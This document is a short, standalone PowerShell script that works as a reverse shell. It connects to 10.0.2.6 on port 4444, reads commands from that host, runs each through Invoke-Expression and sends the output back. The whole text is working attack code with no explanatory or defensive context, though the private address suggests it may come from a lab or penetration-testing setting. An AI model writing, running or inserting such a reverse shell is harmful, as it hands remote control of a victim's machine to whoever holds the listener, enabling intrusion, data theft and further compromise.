$client = New-Object System.Net.Sockets.TCPClient("10.0.2.6", 4444);
     $stream = $client.GetStream();
     $reader = New-Object System.IO.StreamReader($stream);
     $writer = New-Object System.IO.StreamWriter($stream);
     $writer.AutoFlush = $true;

     while ($true) {
         $data = $reader.ReadLine();
         
         
         if ($data -eq "exit") { break }

         try {
             $result = Invoke-Expression $data 2>&1 | Out-String;
             $writer.WriteLine($result);
         } catch {
             $writer.WriteLine("Error: $_");
         }

         $writer.Flush();
     }
